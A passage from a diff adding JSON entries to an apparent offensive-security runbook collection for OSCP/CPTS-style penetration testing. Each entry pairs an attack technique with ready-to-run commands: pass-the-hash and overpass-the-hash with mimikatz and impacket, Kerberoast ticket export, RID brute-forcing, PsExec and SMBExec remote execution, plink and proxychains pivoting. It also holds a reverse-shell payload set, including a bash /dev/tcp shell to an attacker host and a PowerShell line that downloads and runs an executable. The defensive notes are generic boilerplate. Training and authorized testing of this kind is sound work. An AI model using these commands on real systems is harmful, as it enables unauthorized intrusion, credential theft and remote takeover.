+    "description": "<p>This runbook operationalizes <strong>Nmap Baseline Service Recon</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#nmap</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Fast baseline host discovery and service/version fingerprinting before deeper exploitation.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:16; docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:19</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>nmap -sC -sV -T4 &lt;IP&gt;\nnmap -p- &lt;IP&gt;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:offensive",
+      "tool:nmap",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "35ff6b1f-4b9d-5eda-8a13-7784111a1d59",
+    "label": "Overpass-the-Hash to Kerberos-Backed Execution",
+    "command": "impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@<RHOST>\nmimikatz # sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell\nklist",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Overpass-the-Hash to Kerberos-Backed Execution</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#impacket</span> , <span style=\"color:#ef4444;font-weight:bold;\">#mimikatz</span> , <span style=\"color:#ef4444;font-weight:bold;\">#kerberos</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Converts NTLM material into Kerberos-capable sessions and validates ticketed context.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0xsyr0-OSCP/README.md:4799; docs/sources-runbooks/oscp-cpts/p0/0xsyr0-OSCP/README.md:4808</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP/UDP 88</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@&lt;RHOST&gt;\nmimikatz # sekurlsa::pth /user:&lt;USERNAME&gt; /domain:&lt;DOMAIN&gt; /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell\nklist</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:credential-access",
+      "domain:ad",
+      "tool:impacket",
+      "focus:credentials"
+    ]
+  },
+  {
+    "id": "bfebd927-4588-5a41-a066-76a0f8952e40",
+    "label": "Plink Remote and Dynamic Forwarding",
+    "command": "plink -D 9050 ubuntu@<IPaddressofTarget>\nplink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.50.10\nC:/Windows/Temp/plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:<LOCAL-PORT>:127.0.0.1:<REMOTE-PORT> <KALI-IP>",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Plink Remote and Dynamic Forwarding</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#plink</span> , <span style=\"color:#ef4444;font-weight:bold;\">#c</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Uses Plink from Windows pivots for reverse/dynamic tunnels and jump-host chaining.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Pivoting Tunneling Port Forwarding.md:46; docs/sources-runbooks/oscp-cpts/p0/0xsyr0-OSCP/README.md:1194</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>plink -D 9050 ubuntu@&lt;IPaddressofTarget&gt;\nplink.exe -ssh -l &lt;USERNAME&gt; -pw &lt;PASSWORD&gt; -R 127.0.0.1:9833:127.0.0.1:3389 192.168.50.10\nC:\\\\Windows\\\\Temp\\\\plink.exe -ssh -l kali -pw &lt;YOUR PASSWORD HERE&gt; -R 127.0.0.1:&lt;LOCAL-PORT&gt;:127.0.0.1:&lt;REMOTE-PORT&gt; &lt;KALI-IP&gt;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:pivoting",
+      "domain:windows",
+      "tool:plink",
+      "focus:pivoting"
+    ]
+  },
+  {
+    "id": "06d93815-6105-5e99-aeeb-aafdd9d38297",
+    "label": "PowerView Baseline AD Situational Recon",
+    "command": "Import-Module ./PowerView.ps1\nGet-NetUser\nGet-NetComputer\nGet-NetUser -SPN | select samaccountname,serviceprincipalname",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>PowerView Baseline AD Situational Recon</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#import-module</span> , <span style=\"color:#ef4444;font-weight:bold;\">#get-netuser</span> , <span style=\"color:#ef4444;font-weight:bold;\">#get-netcomputer</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Establishes Windows-side AD visibility for users, hosts, and SPN-bearing targets.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/saisathvik1-OSCP-Cheatsheet/README.md:1629; docs/sources-runbooks/oscp-cpts/p0/saisathvik1-OSCP-Cheatsheet/README.md:1631</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>Import-Module .\\\\PowerView.ps1\nGet-NetUser\nGet-NetComputer\nGet-NetUser -SPN | select samaccountname,serviceprincipalname</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:ad",
+      "tool:import-module",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "93ac56e1-b85d-53c2-85d5-e0432022781e",
+    "label": "PowerView Kerberoast Ticket Export (Windows)",
+    "command": "Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName\nGet-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat\nGet-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv ./ilfreight_tgs.csv -NoTypeInformation",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>PowerView Kerberoast Ticket Export (Windows)</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#get-aduser</span> , <span style=\"color:#ef4444;font-weight:bold;\">#get-domainuser</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Identifies SPN accounts and exports crack-ready TGS material directly from Windows context.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/col-1002-HTB-CPTS/CheatSheet/Active Directory Enumeration &amp; Attacks.md:89; docs/sources-runbooks/oscp-cpts/p0/col-1002-HTB-CPTS/CheatSheet/Active Directory Enumeration &amp; Attacks.md:159</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP/UDP 88</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>Get-ADUser -Filter {ServicePrincipalName -ne &quot;$null&quot;} -Properties ServicePrincipalName\nGet-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat\nGet-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\\\ilfreight_tgs.csv -NoTypeInformation</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:credential-access",
+      "domain:ad",
+      "tool:get-aduser",
+      "focus:credentials"
+    ]
+  },
+  {
+    "id": "b212a0a9-4916-5dc0-8b26-405edee09be0",
+    "label": "Proxychains Operational Pivoting",
+    "command": "proxychains nmap -v -Pn -sT <INTERNAL_HOST>\nproxychains msfconsole\nproxychains xfreerdp /v:<TARGET> /u:<USER> /p:<PASS>",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Proxychains Operational Pivoting</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#proxychains</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Routes tooling and interactive protocols through SOCKS pivots for internal reach.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Pivoting Tunneling Port Forwarding.md:14; docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Pivoting Tunneling Port Forwarding.md:15</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 3389</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>proxychains nmap -v -Pn -sT &lt;INTERNAL_HOST&gt;\nproxychains msfconsole\nproxychains xfreerdp /v:&lt;TARGET&gt; /u:&lt;USER&gt; /p:&lt;PASS&gt;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:pivoting",
+      "domain:windows",
+      "tool:proxychains",
+      "focus:pivoting"
+    ]
+  },
+  {
+    "id": "b8c103d2-38ec-504f-8251-927180435856",
+    "label": "PsExec Remote Command Execution",
+    "command": "impacket-psexec administrator:'<PASSWORD>'@<IP>\nimpacket-psexec -hashes 00000000000000000000000000000000:<NTLM_HASH> Administrator@<IP>",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>PsExec Remote Command Execution</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#impacket</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Executes remote shell/commands on SMB-accessible Windows targets.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Attack Common Services.md:24; docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:1438</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 445</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>impacket-psexec administrator:&#x27;&lt;PASSWORD&gt;&#x27;@&lt;IP&gt;\nimpacket-psexec -hashes 00000000000000000000000000000000:&lt;NTLM_HASH&gt; Administrator@&lt;IP&gt;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:credential-access",
+      "domain:windows",
+      "tool:impacket",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "c06069e3-33d9-5b3f-bed8-a2180bea21a1",
+    "label": "RDP Pass-the-Hash Access Workflow",
+    "command": "xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA\nxfreerdp /v:<target_IP> /u:<user> /pth:<NT_hash>",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>RDP Pass-the-Hash Access Workflow</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#xfreerdp</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Uses NTLM hashes directly for interactive RDP logon without plaintext passwords.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Attack Common Services.md:78; docs/sources-runbooks/oscp-cpts/p0/sachinn403-HTB-CPTS/2-initial-access-and-exploitation/attacking-common-services/5.rdp.md:59</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 3389</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA\nxfreerdp /v:&lt;target_IP&gt; /u:&lt;user&gt; /pth:&lt;NT_hash&gt;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:lateral-movement",
+      "domain:windows",
+      "tool:xfreerdp",
+      "focus:credentials"
+    ]
+  },
+  {
+    "id": "03109abb-1620-5a16-9e99-0e82940a175a",
+    "label": "RID Brute User Discovery (SMB)",
+    "command": "crackmapexec smb <IP> -u 'guest' -p '' --rid-brute\nnetexec smb <IP> -u '<USER>' -p '<PASS>' --shares --rid-brute",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>RID Brute User Discovery (SMB)</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#crackmapexec</span> , <span style=\"color:#ef4444;font-weight:bold;\">#netexec</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Enumerates domain/local users through SID/RID expansion.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:93; docs/sources-runbooks/oscp-cpts/p0/0xsyr0-OSCP/README.md:3536</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 445</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>crackmapexec smb &lt;IP&gt; -u &#x27;guest&#x27; -p &#x27;&#x27; --rid-brute\nnetexec smb &lt;IP&gt; -u &#x27;&lt;USER&gt;&#x27; -p &#x27;&lt;PASS&gt;&#x27; --shares --rid-brute</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:credential-access",
+      "domain:network",
+      "tool:crackmapexec",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "d738cacf-a458-56a2-b312-12c0bc7fadd2",
+    "label": "RPC Null Session Domain Enumeration",
+    "command": "rpcclient -U \"\" -N 172.16.5.5\nrpcclient $> querydominfo\nrpcclient $> enumdomusers",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>RPC Null Session Domain Enumeration</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#rpcclient</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Uses RPC null sessions to enumerate domain policy and user RIDs before auth attacks.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Active Directory Enumeration and Attacks.md:39; docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Active Directory Enumeration and Attacks.md:40</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 445</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>rpcclient -U &quot;&quot; -N 172.16.5.5\nrpcclient $&gt; querydominfo\nrpcclient $&gt; enumdomusers</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:network",
+      "tool:rpcclient",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "f5ba1043-eb23-50a1-a28b-0fa1941d5e8b",
+    "label": "Recursive FFUF with Extension Expansion",
+    "command": "ffuf -w .../directory-list-2.3-small.txt:FUZZ -u http://<HOST>/FUZZ -recursion -recursion-depth 1 -e .php\nfor sub in ...; do ffuf -w .../raft-large-words-lowercase.txt:FUZZ -u http://$sub.<DOMAIN>/FUZZ -recursion -recursion-depth 1 -e .php,.phps,.php7 -v -t 200 -ic; done",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Recursive FFUF with Extension Expansion</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#ffuf</span> , <span style=\"color:#ef4444;font-weight:bold;\">#for</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Expands discovery depth and file-type coverage for app surface mapping.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/FFUF-Web-Fuzzing.md:227; docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/FFUF-Web-Fuzzing.md:129</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>ffuf -w .../directory-list-2.3-small.txt:FUZZ -u http://&lt;HOST&gt;/FUZZ -recursion -recursion-depth 1 -e .php\nfor sub in ...; do ffuf -w .../raft-large-words-lowercase.txt:FUZZ -u http://$sub.&lt;DOMAIN&gt;/FUZZ -recursion -recursion-depth 1 -e .php,.phps,.php7 -v -t 200 -ic; done</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:initial-access",
+      "domain:web",
+      "tool:ffuf",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "b68f4b8c-d9c9-54f4-b3d1-77825b2de6c5",
+    "label": "Reverse Shell Multi-Language Payload Set",
+    "command": "/bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\npython3 -c 'import socket,subprocess,os,pty; ...; pty.spawn(\"/bin/bash\")'\npowershell -c \"Invoke-WebRequest -Uri http://<LHOST>/rs.exe -OutFile C:/windows/temp/rs.exe; Start-Process C:/windows/temp/rs.exe\"",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Reverse Shell Multi-Language Payload Set</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#bash</span> , <span style=\"color:#ef4444;font-weight:bold;\">#python3</span> , <span style=\"color:#ef4444;font-weight:bold;\">#powershell</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Provides fallback reverse-shell execution across Linux and Windows footholds.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:474; docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:487</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>/bin/bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1\npython3 -c &#x27;import socket,subprocess,os,pty; ...; pty.spawn(&quot;/bin/bash&quot;)&#x27;\npowershell -c &quot;Invoke-WebRequest -Uri http://&lt;LHOST&gt;/rs.exe -OutFile C:\\\\windows\\\\temp\\\\rs.exe; Start-Process C:\\\\windows\\\\temp\\\\rs.exe&quot;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:initial-access",
+      "domain:ad",
+      "tool:bash",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "b9fdfde4-c5a4-547a-ac32-161bff37f741",
+    "label": "SMBExec Remote Shell Execution",
+    "command": "smbexec.py test.local/john:password123@10.10.10.1\nsmbexec.py -hashes lmhash:nthash test.local/john@10.10.10.1\nimpacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>SMBExec Remote Shell Execution</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#impacket</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Executes remote commands through SMB service channels with credential or hash auth.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/saisathvik1-OSCP-Cheatsheet/README.md:573; docs/sources-runbooks/oscp-cpts/p0/saisathvik1-OSCP-Cheatsheet/README.md:574</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 445</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>smbexec.py test.local/john:password123@10.10.10.1\nsmbexec.py -hashes lmhash:nthash test.local/john@10.10.10.1\nimpacket-smbexec &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt; -k -no-pass</code></pre>",
+    "tags": [
+      "oscp-cpts",
